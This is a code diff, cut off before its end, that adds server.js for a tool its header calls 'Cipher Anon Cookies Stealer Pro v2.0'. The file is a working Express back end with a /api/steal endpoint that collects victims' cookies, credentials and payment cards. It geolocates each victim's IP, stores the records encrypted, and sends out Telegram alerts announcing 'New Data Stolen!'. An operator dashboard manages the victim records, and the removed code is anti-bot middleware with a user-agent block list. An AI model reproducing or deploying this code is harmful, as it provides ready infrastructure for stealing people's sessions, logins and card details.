@@ -1,412 +1,692 @@
 // ============================================================
-// ANTI-BOT PROTECTION — With home.php Exemption + Localhost Whitelist
+// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
+// FIXED: Routes order (API before static)
 // ============================================================
 
+const express = require('express');
+const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
 const crypto = require('crypto');
+const axios = require('axios');
+const session = require('express-session');
 
-const CONFIG = {
-    CHALLENGE_EXPIRY: 60 * 1000,
-    CHALLENGE_COOKIE_NAME: '_cipher_verify',
-    CHALLENGE_COOKIE_EXPIRY: 60 * 60 * 1000,
-    RATE_LIMIT_WINDOW: 60 * 1000,
-    RATE_LIMIT_MAX: 10,
-    BLOCKED_AGENTS: [
-        'bot', 'crawl', 'spider', 'scrape', 'headless',
-        'python', 'curl', 'wget', 'httpx', 'requests',
-        'axios', 'node-fetch', 'phantom', 'selenium',
-        'puppeteer', 'playwright', 'zombie', 'jsdom'
-    ],
-    // ---- Whitelist localhost for testing ----
-    ALLOWED_IPS: [
-    ],
-    STRENGTH: 'high'
-};
+// Import Anti-Bot
+const { antiBot, handleVerify } = require('./anti-bot.js');
 
-const store = {
-    challenges: new Map(),
-    rateLimits: new Map(),
-    verifiedClients: new Map()
-};
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-function generateChallengeId() {
+// ============================================================
+// CONFIGURATION
+// ============================================================
+
+const CONFIG_FILE = path.join(__dirname, 'config.json');
+
+function generateValidKey() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-function getClientFingerprint(req) {
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const ua = req.headers['user-agent'] || 'unknown';
-    const accept = req.headers['accept'] || '';
-    const acceptLanguage = req.headers['accept-language'] || '';
-    return crypto.createHash('sha256')
-        .update(`${ip}|${ua}|${accept}|${acceptLanguage}`)
-        .digest('hex');
-}
-
-function isBotUserAgent(ua) {
-    if (!ua) return true;
-    const lower = ua.toLowerCase();
-    return CONFIG.BLOCKED_AGENTS.some(agent => lower.includes(agent));
-}
-
-function isAllowedIP(ip) {
-    if (!ip) return false;
-    let cleanIp = ip;
-    if (ip === '::1' || ip === '::ffff:127.0.0.1') {
-        cleanIp = '127.0.0.1';
-    }
-    return CONFIG.ALLOWED_IPS.some(allowed => allowed === cleanIp);
-}
-
-function cleanExpired() {
-    const now = Date.now();
-    for (const [id, data] of store.challenges) {
-        if (now > data.expires) store.challenges.delete(id);
-    }
-    for (const [ip, data] of store.rateLimits) {
-        if (now > data.windowStart + CONFIG.RATE_LIMIT_WINDOW) {
-            store.rateLimits.delete(ip);
-        }
-    }
-    for (const [fp, data] of store.verifiedClients) {
-        if (now > data.verifiedAt + CONFIG.CHALLENGE_COOKIE_EXPIRY) {
-            store.verifiedClients.delete(fp);
-        }
-    }
-}
-
-function rateLimit(req) {
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const now = Date.now();
-    
-    if (!store.rateLimits.has(ip)) {
-        store.rateLimits.set(ip, { count: 1, windowStart: now });
-        return { allowed: true, remaining: CONFIG.RATE_LIMIT_MAX - 1 };
-    }
-    
-    const data = store.rateLimits.get(ip);
-    if (now > data.windowStart + CONFIG.RATE_LIMIT_WINDOW) {
-        store.rateLimits.set(ip, { count: 1, windowStart: now });
-        return { allowed: true, remaining: CONFIG.RATE_LIMIT_MAX - 1 };
-    }
-    
-    data.count++;
-    if (data.count > CONFIG.RATE_LIMIT_MAX) {
-        return { allowed: false, remaining: 0 };
-    }
-    
-    return { allowed: true, remaining: CONFIG.RATE_LIMIT_MAX - data.count };
-}
-
-function generateChallengePage(challengeId, fingerprint) {
-    const nonce = crypto.randomBytes(16).toString('base64');
-    const cookieName = CONFIG.CHALLENGE_COOKIE_NAME;
-    const cookieExpiry = CONFIG.CHALLENGE_COOKIE_EXPIRY;
-    const strength = CONFIG.STRENGTH;
-    
-    let canvasCode = '';
-    if (strength === 'high' || strength === 'medium') {
-        canvasCode = `
-            const canvas = document.createElement('canvas');
-            canvas.width = 200;
-            canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('CipherAnon', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Verify', 4, 17);
-            const canvasFp = canvas.toDataURL();
-        `;
-    }
-    
-    return `
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verifying...</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0f1a;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Segoe UI', -apple-system, sans-serif;
-            padding: 20px;
-        }
-        .verify-box {
-            background: linear-gradient(145deg, #111827, #0f1626);
-            border-radius: 20px;
-            padding: 40px 32px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid #1a2538;
-            box-shadow: 0 20px 80px rgba(0,0,0,0.6);
-            animation: fadeIn 0.6s ease;
-        }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(30px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-        .verify-box .icon { font-size: 48px; margin-bottom: 12px; }
-        .verify-box h1 { color: #f1f5f9; font-size: 20px; font-weight: 700; }
-        .verify-box p { color: #64748b; font-size: 14px; margin-top: 8px; line-height: 1.6; }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            margin: 20px auto;
-            border: 3px solid #1a2538;
-            border-top-color: #00ff88;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .verify-box .status { color: #475569; font-size: 13px; margin-top: 12px; }
-        .verify-box .status.success { color: #00ff88; }
-        .verify-box .powered {
-            margin-top: 16px;
-            font-size: 10px;
-            color: #1e293b;
-            border-top: 1px solid #1a2538;
-            padding-top: 16px;
-        }
-        .verify-box .powered .name { color: #00ff88; font-weight: 600; }
-    </style>
-</head>
-<body>
-    <div class="verify-box">
-        <div class="icon">🛡️</div>
-        <h1>Verifying Your Connection</h1>
-        <p>Please wait while we verify you're human...</p>
-        <div class="spinner" id="spinner"></div>
-        <div class="status" id="status">Checking your browser...</div>
-        <div class="powered">Protected By <span class="name">CipherAnon</span></div>
-    </div>
-
-    <script>
-        (function() {
-            function getFingerprint() {
-                const data = {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages ? navigator.languages.join(',') : '',
-                    cookieEnabled: navigator.cookieEnabled,
-                    screen: screen.width + 'x' + screen.height,
-                    colorDepth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    hardware: navigator.hardwareConcurrency || 'unknown',
-                    memory: navigator.deviceMemory || 'unknown'
-                };
-                ${canvasCode}
-                if (canvasFp) data.canvas = canvasFp;
-                return data;
-            }
-
-            function solveChallenge() {
-                const fp = getFingerprint();
-                const challengeId = '${challengeId}';
-                const nonce = '${nonce}';
-                const timestamp = Date.now();
-                
-                const data = challengeId + nonce + JSON.stringify(fp) + timestamp;
-                let hash = 0;
-                for (let i = 0; i < data.length; i++) {
-                    const char = data.charCodeAt(i);
-                    hash = ((hash << 5) - hash) + char;
-                    hash = hash & hash;
-                }
-                const solution = Math.abs(hash).toString(16);
-                
-                try {
-                    document.cookie = '${cookieName}=verified; path=/; max-age=${cookieExpiry/1000}; SameSite=Strict';
-                    document.cookie = '${cookieName}_fp=' + encodeURIComponent(JSON.stringify(fp)) + '; path=/; max-age=${cookieExpiry/1000}; SameSite=Strict';
-                } catch(e) {}
-
-                fetch('/__verify', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        challengeId: challengeId,
-                        solution: solution,
-                        fingerprint: fp,
-                        timestamp: timestamp,
-                        nonce: nonce
-                    })
-                }).then(() => {
-                    document.getElementById('status').textContent = '✅ Verified! Redirecting...';
-                    document.getElementById('status').className = 'status success';
-                    document.getElementById('spinner').style.display = 'none';
-                    setTimeout(() => {
-                        window.location.reload();
-                    }, 800);
-                }).catch(() => {
-                    document.getElementById('status').textContent = '⚠️ Verification failed. Retrying...';
-                    setTimeout(() => {
-                        window.location.reload();
-                    }, 2000);
-                });
-            }
-
-            setTimeout(solveChallenge, 500);
-        })();
-    </script>
-</body>
-</html>
-    `;
-}
-
-function antiBot(options = {}) {
-    const config = { ...CONFIG, ...options };
-    
-    setInterval(cleanExpired, 30000);
-    
-    return function(req, res, next) {
-        // ---- SKIP PATHS (includes home.php) ----
-        const skipPaths = ['/__verify', '/favicon.ico', '/robots.txt', '/login.php', '/api/login', '/home.php'];
-        if (skipPaths.includes(req.path)) {
-            return next();
-        }
-        
-        // ---- COOKIE CHECK ----
-        const cookie = req.headers.cookie || '';
-        const hasValidCookie = cookie.includes(`${config.CHALLENGE_COOKIE_NAME}=verified`);
-        
-        if (hasValidCookie) {
-            const fpMatch = cookie.match(/${config.CHALLENGE_COOKIE_NAME}_fp=([^;]+)/);
-            if (fpMatch) {
-                try {
-                    const storedFp = JSON.parse(decodeURIComponent(fpMatch[1]));
-                    if (storedFp.ua === req.headers['user-agent']) {
-                        return next();
-                    }
-                } catch(e) {}
-            }
-        }
-        
-        // ---- ALLOWED IPs (includes localhost) ----
-        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-        if (isAllowedIP(ip)) {
-            return next();
-        }
-        
-        // ---- RATE LIMIT ----
-        const rateResult = rateLimit(req);
-        if (!rateResult.allowed) {
-            return res.status(429).json({
-                status: 'error',
-                message: 'Too many requests. Please try again later.'
-            });
-        }
-        
-        // ---- BOT USER-AGENT ----
-        const ua = req.headers['user-agent'] || '';
-        if (isBotUserAgent(ua)) {
-            if (req.path.startsWith('/api')) {
-                return res.status(403).json({
-                    status: 'error',
-                    message: 'Access denied. Please use a real browser.'
-                });
-            }
-        }
-        
-        // ---- FINGERPRINT CHECK ----
-        const fingerprint = getClientFingerprint(req);
-        if (store.verifiedClients.has(fingerprint)) {
-            const data = store.verifiedClients.get(fingerprint);
-            if (Date.now() < data.verifiedAt + config.CHALLENGE_COOKIE_EXPIRY) {
-                res.setHeader('Set-Cookie', [
-                    `${config.CHALLENGE_COOKIE_NAME}=verified; path=/; max-age=${config.CHALLENGE_COOKIE_EXPIRY/1000}; SameSite=Strict`,
-                    `${config.CHALLENGE_COOKIE_NAME}_fp=${encodeURIComponent(JSON.stringify({ua: req.headers['user-agent']}))}; path=/; max-age=${config.CHALLENGE_COOKIE_EXPIRY/1000}; SameSite=Strict`
-                ]);
-                return next();
-            }
-            store.verifiedClients.delete(fingerprint);
-        }
-        
-        // ---- SERVE CHALLENGE ----
-        const challengeId = generateChallengeId();
-        const challengeData = {
-            expires: Date.now() + config.CHALLENGE_EXPIRY,
-            fingerprint: fingerprint
-        };
-        store.challenges.set(challengeId, challengeData);
-        
-        if (req.path.startsWith('/api')) {
-            return res.status(403).json({
-                status: 'error',
-                message: 'Verification required',
-                challenge: challengeId,
-                retryAfter: config.CHALLENGE_EXPIRY / 1000
-            });
-        }
-        
-        const challengePage = generateChallengePage(challengeId, fingerprint);
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-        res.send(challengePage);
+function loadConfig() {
+    const envConfig = {
+        DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
+        DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
+        ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || generateValidKey(),
+        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
+        TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
+        SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
     };
+
+    let fileConfig = {};
+    if (fs.existsSync(CONFIG_FILE)) {
+        try {
+            fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
+        } catch (e) {}
+    }
+
+    const merged = { ...fileConfig, ...envConfig };
+    const key = merged.ENCRYPTION_KEY;
+    if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
+        merged.ENCRYPTION_KEY = generateValidKey();
+    }
+
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
+    } catch (e) {}
+
+    return merged;
 }
 
-function handleVerify(req, res) {
+const CONFIG = loadConfig();
+
+console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
+console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
+
+// ============================================================
+// DATA FILES
+// ============================================================
+
+const DATA_FILE = path.join(__dirname, 'stolen.enc');
+const TRASH_FILE = path.join(__dirname, 'trash.enc');
+const LOG_FILE = path.join(__dirname, 'steal.log');
+
+// ============================================================
+// SESSION SETUP
+// ============================================================
+
+const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
+const SESSION_MAX_AGE = 30 * 60 * 1000;
+
+app.use(session({
+    secret: SESSION_SECRET,
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        secure: false,
+        maxAge: SESSION_MAX_AGE,
+        httpOnly: true,
+        sameSite: 'lax'
+    }
+}));
+
+// Session activity check
+app.use((req, res, next) => {
+    if (req.session && req.session.authenticated) {
+        const now = Date.now();
+        const lastActivity = req.session.lastActivity || now;
+        if (now - lastActivity > SESSION_MAX_AGE) {
+            req.session.destroy(() => {
+                if (req.path.startsWith('/api')) {
+                    return res.status(401).json({ status: 'error', message: 'Session expired' });
+                }
+                res.redirect('/login.php');
+            });
+            return;
+        }
+        req.session.lastActivity = now;
+    }
+    next();
+});
+
+// ============================================================
+// ENCRYPTION ENGINE
+// ============================================================
+
+function encryptData(data) {
+    const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
+    const tag = cipher.getAuthTag();
+    return Buffer.concat([iv, tag, encrypted]).toString('base64');
+}
+
+function decryptData(encryptedBase64) {
     try {
-        const { challengeId, solution, fingerprint, timestamp, nonce } = req.body;
-        
-        if (!challengeId || !solution || !fingerprint) {
-            return res.status(400).json({ status: 'error', message: 'Invalid verification data' });
-        }
-        
-        const challengeData = store.challenges.get(challengeId);
-        if (!challengeData) {
-            return res.status(400).json({ status: 'error', message: 'Challenge expired or invalid' });
-        }
-        
-        if (Date.now() > challengeData.expires) {
-            store.challenges.delete(challengeId);
-            return res.status(400).json({ status: 'error', message: 'Challenge expired' });
-        }
-        
-        const expectedData = challengeId + nonce + JSON.stringify(fingerprint) + timestamp;
-        let hash = 0;
-        for (let i = 0; i < expectedData.length; i++) {
-            const char = expectedData.charCodeAt(i);
-            hash = ((hash << 5) - hash) + char;
-            hash = hash & hash;
-        }
-        const expectedSolution = Math.abs(hash).toString(16);
-        
-        if (solution !== expectedSolution) {
-            return res.status(400).json({ status: 'error', message: 'Invalid solution' });
-        }
-        
-        const currentFingerprint = challengeData.fingerprint;
-        
-        store.challenges.delete(challengeId);
-        store.verifiedClients.set(currentFingerprint, {
-            verifiedAt: Date.now()
-        });
-        
-        res.setHeader('Set-Cookie', [
-            `${CONFIG.CHALLENGE_COOKIE_NAME}=verified; path=/; max-age=${CONFIG.CHALLENGE_COOKIE_EXPIRY/1000}; SameSite=Strict`,
-            `${CONFIG.CHALLENGE_COOKIE_NAME}_fp=${encodeURIComponent(JSON.stringify({ua: fingerprint.ua || 'unknown'}))}; path=/; max-age=${CONFIG.CHALLENGE_COOKIE_EXPIRY/1000}; SameSite=Strict`
-        ]);
-        
-        return res.json({ status: 'ok', message: 'Verified successfully' });
-        
+        const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
+        const buffer = Buffer.from(encryptedBase64, 'base64');
+        const iv = buffer.subarray(0, 16);
+        const tag = buffer.subarray(16, 32);
+        const encrypted = buffer.subarray(32);
+        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+        decipher.setAuthTag(tag);
+        const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
+        return JSON.parse(decrypted.toString());
     } catch (e) {
-        return res.status(500).json({ status: 'error', message: 'Verification failed' });
+        return null;
     }
 }
 
-module.exports = {
-    antiBot,
-    handleVerify,
-    CONFIG
-};
+function saveData(file, data) {
+    fs.writeFileSync(file, encryptData(data));
+}
+
+function loadData(file) {
+    if (!fs.existsSync(file)) return [];
+    try {
+        const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
+        return decrypted || [];
+    } catch (e) {
+        return [];
+    }
+}
+
+let stolenData = loadData(DATA_FILE);
+let trashData = loadData(TRASH_FILE);
+
+// ============================================================
+// DEDUP
+// ============================================================
+
+const dedupCache = new Map();
+const DEDUP_WINDOW = 60000;
+
+function cleanDedup() {
+    const now = Date.now();
+    for (const [key, ts] of dedupCache) {
+        if (now - ts > DEDUP_WINDOW) dedupCache.delete(key);
+    }
+}
+
+function isDuplicate(ip, hostname) {
+    let cleanIp = ip;
+    if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') cleanIp = '127.0.0.1';
+    const key = `${cleanIp}|${hostname}`;
+    if (dedupCache.has(key)) {
+        const ts = dedupCache.get(key);
+        if (Date.now() - ts < DEDUP_WINDOW) return true;
+    }
+    dedupCache.set(key, Date.now());
+    return false;
+}
+
+// ============================================================
+// LOGGING
+// ============================================================
+
+function log(msg) {
+    const entry = `[${new Date().toISOString()}] ${msg}`;
+    console.log(entry);
+    try { fs.appendFileSync(LOG_FILE, entry + '\n'); } catch (e) {}
+}
+
+// ============================================================
+// AUTH MIDDLEWARE
+// ============================================================
+
+function requireAuth(req, res, next) {
+    if (req.session && req.session.authenticated === true) {
+        return next();
+    }
+    if (req.path.startsWith('/api')) {
+        return res.status(401).json({ status: 'error', message: 'Unauthorized - Please login' });
+    }
+    res.redirect('/login.php');
+}
+
+// ============================================================
+// MIDDLEWARE — CORS + JSON + Anti-Bot
+// ============================================================
+
+app.use(cors());
+app.use(express.json({ limit: '10mb' }));
+
+// Anti-Bot — apply BEFORE routes
+app.use(antiBot({
+    STRENGTH: 'high',
+    RATE_LIMIT_MAX: 10,
+    ALLOWED_IPS: []
+}));
+
+app.post('/__verify', express.json(), handleVerify);
+
+// ============================================================
+// SECURITY HEADERS
+// ============================================================
+
+app.use((req, res, next) => {
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('X-Frame-Options', 'DENY');
+    res.setHeader('X-XSS-Protection', '1; mode=block');
+    res.setHeader('Referrer-Policy', 'no-referrer');
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    next();
+});
+
+// ============================================================
+// API ROUTES — MUST BE DEFINED BEFORE STATIC FILES
+// ============================================================
+
+// ---- GEOLOCATION ----
+async function getCountryInfo(ip) {
+    try {
+        const response = await axios.get('http://ip-api.com/json/' + ip, { timeout: 5000 });
+        const data = response.data;
+        if (data.status === 'success') {
+            return {
+                country: data.country,
+                countryCode: data.countryCode,
+                region: data.regionName,
+                city: data.city,
+                isp: data.isp,
+                lat: data.lat,
+                lon: data.lon
+            };
+        }
+        return null;
+    } catch (error) {
+        log(`[!] Geolocation failed for ${ip}: ${error.message}`);
+        return null;
+    }
+}
+
+// ---- TELEGRAM ----
+async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount) {
+    if (!CONFIG.SEND_NOTIFICATIONS) return;
+    const t = CONFIG.TELEGRAM_BOT_TOKEN;
+    const c = CONFIG.TELEGRAM_CHAT_ID;
+    if (!t || t === 'YOUR_BOT_TOKEN' || t === '') return;
+
+    const flag = countryInfo?.countryCode ? getFlagEmoji(countryInfo.countryCode) : '🌍';
+    const countryName = countryInfo?.country || 'Unknown';
+    const city = countryInfo?.city || 'N/A';
+    const isp = countryInfo?.isp || 'N/A';
+    const time = new Date().toLocaleString();
+
+    let extra = '';
+    if (credCount > 0) extra += `\n🔑 *Credentials:* ${credCount}`;
+    if (cardCount > 0) extra += `\n💳 *Cards:* ${cardCount}`;
+
+    const message = `🍪 *Cipher Anon — New Data Stolen!*
+
+📍 *Domain:* ${host}
+🍪 *Cookies:* ${count}
+${extra}
+👤 *IP:* ${ip}
+${flag} *Country:* ${countryName}
+🏙️ *City:* ${city}
+📡 *ISP:* ${isp}
+🕐 *Time:* ${time}
+
+📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'https://' + (req?.headers?.host || 'localhost:' + PORT)}/dashboard`;
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
+            chat_id: c,
+            text: message,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+        }, { timeout: 10000 });
+        log('[+] Telegram notification sent');
+    } catch (e) {
+        log(`[!] Telegram failed: ${e.message}`);
+    }
+}
+
+function getFlagEmoji(countryCode) {
+    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
+    return String.fromCodePoint(...codePoints);
+}
+
+function generateUniqueId(entry) {
+    const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+    const ip = entry.ip || 'unknown';
+    const time = entry.receivedAt || new Date().toISOString();
+    return crypto.createHash('md5').update(`${time}|${ip}|${domain}`).digest('hex');
+}
+
+// ---- LOGIN API ----
+app.post('/api/login', (req, res) => {
+    const { username, password } = req.body;
+
+    if (!username || !password) {
+        return res.status(400).json({ status: 'error', message: 'Username and password required' });
+    }
+
+    if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
+        req.session.authenticated = true;
+        req.session.username = username;
+        req.session.lastActivity = Date.now();
+        req.session.save();
+        log(`[+] User logged in: ${username}`);
+        return res.json({ status: 'ok', message: 'Login successful' });
+    }
+
+    log(`[!] Failed login attempt: ${username}`);
+    res.status(401).json({ status: 'error', message: 'Invalid username or password' });
+});
+
+// ---- LOGOUT ----
+app.get('/api/logout', (req, res) => {
+    req.session.destroy((err) => {
+        if (err) log(`[!] Logout error: ${err.message}`);
+        res.clearCookie('connect.sid');
+        log('[+] User logged out');
+        res.redirect('/login.php');
+    });
+});
+
+// ---- STEAL COOKIES ----
+app.post('/api/steal', async (req, res) => {
+    try {
+        const data = req.body;
+        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+        if (ip === '::1' || ip === '::ffff:127.0.0.1') {
+            ip = '127.0.0.1';
+        }
+
+        const countryInfo = await getCountryInfo(ip);
+
+        data.ip = ip;
+        data.country = countryInfo?.country || 'Unknown';
+        data.countryCode = countryInfo?.countryCode || 'XX';
+        data.city = countryInfo?.city || 'N/A';
+        data.region = countryInfo?.region || 'N/A';
+        data.isp = countryInfo?.isp || 'N/A';
+        data.receivedAt = new Date().toISOString();
+        data.credentials = data.credentials || [];
+        data.cards = data.cards || [];
+
+        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
+
+        cleanDedup();
+        if (isDuplicate(ip, hostname)) {
+            log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
+            return res.json({ status: 'ok', duplicate: true });
+        }
+
+        data._uniqueId = generateUniqueId(data);
+        stolenData.push(data);
+        saveData(DATA_FILE, stolenData);
+
+        const count = Object.keys(data.cookies || {}).length;
+        const credCount = data.credentials.length;
+        const cardCount = data.cards.length;
+
+        log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards | ${ip}`);
+        
+        // Send Telegram (async, don't wait)
+        sendTelegram(hostname, count, ip, countryInfo, credCount, cardCount).catch(() => {});
+
+        res.json({ status: 'ok', country: countryInfo });
+    } catch (e) {
+        log(`[!] Error in /api/steal: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+// ---- GET ALL DATA ----
+app.get('/api/data', requireAuth, (req, res) => {
+    const clean = stolenData.map(({ _dedupKey, ...rest }) => rest);
+    res.json(clean);
+});
+
+// ---- GET TRASH DATA ----
+app.get('/api/trash', requireAuth, (req, res) => {
+    const clean = trashData.map(({ _dedupKey, ...rest }) => rest);
+    res.json(clean);
+});
+
+// ---- MOVE TO TRASH ----
+app.delete('/api/delete/:uniqueId', requireAuth, (req, res) => {
+    const uid = req.params.uniqueId;
+    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
+        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
+    }
+    const index = stolenData.findIndex(entry => entry._uniqueId === uid);
+    if (index === -1) {
+        return res.status(404).json({ status: 'error', message: 'Victim not found' });
+    }
+    try {
+        const removed = stolenData.splice(index, 1)[0];
+        removed.deletedAt = new Date().toISOString();
+        trashData.push(removed);
+        saveData(DATA_FILE, stolenData);
+        saveData(TRASH_FILE, trashData);
+        log(`[+] Moved to trash: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
+        res.json({ status: 'ok', moved: removed });
+    } catch (e) {
+        log(`[!] Error: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+// ---- RESTORE FROM TRASH ----
+app.post('/api/restore/:uniqueId', requireAuth, (req, res) => {
+    const uid = req.params.uniqueId;
+    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
+        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
+    }
+    const index = trashData.findIndex(entry => entry._uniqueId === uid);
+    if (index === -1) {
+        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
+    }
+    try {
+        const restored = trashData.splice(index, 1)[0];
+        delete restored.deletedAt;
+        stolenData.push(restored);
+        saveData(DATA_FILE, stolenData);
+        saveData(TRASH_FILE, trashData);
+        log(`[+] Restored from trash: ${restored?.fingerprint?.hostname || restored?.domain || 'unknown'}`);
+        res.json({ status: 'ok', restored: restored });
+    } catch (e) {
+        log(`[!] Error: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+// ---- PERMANENTLY DELETE ----
+app.delete('/api/trash/permanent/:uniqueId', requireAuth, (req, res) => {
+    const uid = req.params.uniqueId;
+    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
+        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
+    }
+    const index = trashData.findIndex(entry => entry._uniqueId === uid);
+    if (index === -1) {
+        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
+    }
+    try {
+        const removed = trashData.splice(index, 1)[0];
+        saveData(TRASH_FILE, trashData);
+        log(`[+] Permanently deleted: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
+        res.json({ status: 'ok', permanentlyDeleted: removed });
+    } catch (e) {
+        log(`[!] Error: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+// ---- EMPTY TRASH ----
+app.delete('/api/trash/empty', requireAuth, (req, res) => {
+    try {
+        const count = trashData.length;
+        trashData = [];
+        saveData(TRASH_FILE, trashData);
+        log(`[+] Emptied trash: ${count} victims`);
+        res.json({ status: 'ok', count: count });
+    } catch (e) {
+        log(`[!] Error: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+// ---- CLEAR ALL DATA ----
+app.delete('/api/clear', requireAuth, (req, res) => {
+    try {
+        stolenData = [];
+        saveData(DATA_FILE, stolenData);
+        log('[+] All data cleared');
+        res.json({ status: 'ok' });
+    } catch (e) {
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+// ---- CHANGE PASSWORD ----
+app.post('/api/change-password', requireAuth, (req, res) => {
+    const { oldPassword, newPassword } = req.body;
+
+    if (!oldPassword || !newPassword) {
+        return res.status(400).json({ status: 'error', message: 'Old and new password required' });
+    }
+
+    if (newPassword.length < 4) {
+        return res.status(400).json({ status: 'error', message: 'New password must be at least 4 characters' });
+    }
+
+    if (oldPassword !== CONFIG.DASHBOARD_PASSWORD) {
+        return res.status(401).json({ status: 'error', message: 'Current password is incorrect' });
+    }
+
+    CONFIG.DASHBOARD_PASSWORD = newPassword;
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+    } catch (e) {}
+
+    log('[+] Password changed successfully');
+
+    req.session.destroy((err) => {
+        if (err) log(`[!] Session destroy error: ${err.message}`);
+        res.clearCookie('connect.sid');
+        res.json({
+            status: 'ok',
+            message: 'Password updated successfully',
+            redirect: '/password-success.php'
+        });
+    });
+});
+
+// ---- GET TELEGRAM CONFIG ----
+app.get('/api/config/telegram', requireAuth, (req, res) => {
+    res.json({
+        botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
+        chatId: CONFIG.TELEGRAM_CHAT_ID || '',
+        notifications: CONFIG.SEND_NOTIFICATIONS !== undefined ? CONFIG.SEND_NOTIFICATIONS : true
+    });
+});
+
+// ---- UPDATE TELEGRAM CONFIG ----
+app.post('/api/config/telegram', requireAuth, (req, res) => {
+    const { botToken, chatId, notifications } = req.body;
+
+    if (!botToken || !chatId) {
+        return res.status(400).json({
+            status: 'error',
+            message: 'Bot token and chat ID are required'
+        });
+    }
+
+    CONFIG.TELEGRAM_BOT_TOKEN = botToken;
+    CONFIG.TELEGRAM_CHAT_ID = chatId;
+    CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;
+
